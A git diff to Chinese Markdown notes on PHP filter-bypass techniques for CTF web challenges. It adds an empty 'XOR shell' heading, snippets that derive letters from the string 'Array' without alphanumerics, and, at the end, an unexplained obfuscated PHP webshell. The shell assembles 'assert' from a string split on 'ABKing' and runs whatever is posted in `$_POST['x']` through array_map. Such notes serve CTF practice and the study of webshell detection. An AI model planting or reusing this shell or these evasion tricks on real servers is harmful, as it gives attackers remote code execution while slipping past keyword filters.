@@ -126,6 +126,9 @@ foreach($whitelist as $a){
 }
 ```
 
+#### 异或shell
+
+
 
 ### 取反
 
@@ -240,6 +243,16 @@ $_["__"]($_["_"])]?>//$_POST["__"]($_POST["_"])
 
 还可以用 ``<?=?> 替代分号逗号
 
+```php
+$_=[].[];#$_='ArrayArray'
+$_=''.[];#$_='Array'
+```
+
+```php
+<?php $_=[].[];$__=0;$__++;$__++;$__++;$_=$_[$__]; #$_='a'
+<?php $_=''.[];$__=0;$__++;$__++;$__++;$_=$_[$__]; #$_='a'
+```
+
 ### “数字”拼接
 
 >  PHP 中，将两个数字使用.拼接，会当做字符串来处理，返回的也是一个字符串。例如：(1).(2)出来的就是字符串"12"，然后可以用{}来代替[]来取单个字符。
@@ -351,3 +364,29 @@ echo(readfile(end(scandir())))))));
 #### 参考资料
 
 RoarCTF Web writeup https://github.red/roarctf-web-writeup/
+
+
+## 
+
+```php
+<?php
+error_reporting(0);
+function argu($a, $b){
+    $ext = explode('ABKing',$a);
+    $ext1 = $ext[0];
+    $ext2 = $ext[1];
+    $ext3 = $ext[2];
+    $ext4 = $ext[3];
+    $ext5 = $ext[4];
+    $ext6 = $ext[5];
+    $arr[0] = $ext1.$ext2.$ext3.$ext4.$ext5.$ext6;
+    $arr[1] = $b;
+    return $arr;
+}
+$b = $_POST['x'];
+$arr = argu("aABKingsABKingsABKingeABKingrABKingt", $b);
+$x = $arr[0];
+$y = $arr[1];
+array_map($x, array($y));
+?>
+```
